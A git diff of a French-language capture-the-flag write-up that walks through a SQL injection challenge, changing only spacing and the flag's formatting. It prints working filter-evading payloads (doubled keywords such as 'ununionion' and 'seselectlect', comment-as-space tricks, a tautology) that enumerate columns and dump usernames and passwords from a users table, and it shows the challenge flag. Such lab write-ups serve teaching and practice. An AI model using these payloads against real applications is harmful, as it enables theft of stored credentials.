@@ -32,6 +32,7 @@ Nous remarquons que pour réussir ce challenge, nous devons faire de telle sorte
 Ainsi, nous avons effectué plusieurs requêtes SQL avant d'atteindre le but.
 
 Premier payload: ```'OORROR(1=1)OORROR'a'='```
+
 Rendu:
 ![Rendu](Images/First-payload.png)
 
@@ -40,6 +41,7 @@ Le rendu ne nous révèle aucun flag. On a agit donc autrement à travers les é
 * **Identification des colonnes vulnérables**
 
 Payload: ```inspiv'/**/ununionion/**/all/**/seselectlect/**/1,2,3,4/**/#```
+
 Rendu:
 ![Rendu](Images/vuln-columns.png)
 On peut donc retenir que les colonnes 2, 3 et 4 sont vulnérables.
@@ -79,9 +81,9 @@ Nous pouvons remarquer qu'en dehors des colonnes de la table _hack_hackerlab_ , 
 Payload: ```inspiv'/**/ununionion/**/all/**/seselectlect/**/1,2,group_concat(id89l,passwoorrd,username),4/**/frfromom/**/users/**/#```
 ![Rendu](Images/flag.png)
 Nous obtenons ainsi le flag
-```
-FLAG: CTF_Y0uAreAwas0m3_b__t___es
-```
+
+```FLAG: CTF_Y0uAreAwas0m3_b__t___es```
+
 Cependant nous avons le début d'une clé publique. L'intégralité de la clé ne s'est pas affichéé à cause de la limite de la fonction _group_concat_. Alors nous sommes obligés de modifier notre requête.
 
 Nouveau Payload: ```inspiv'/**/uniunionon/**/all/**/seleselectct/**/1,passwoORrd,222,username/**/frfromom/**/users/**/#```
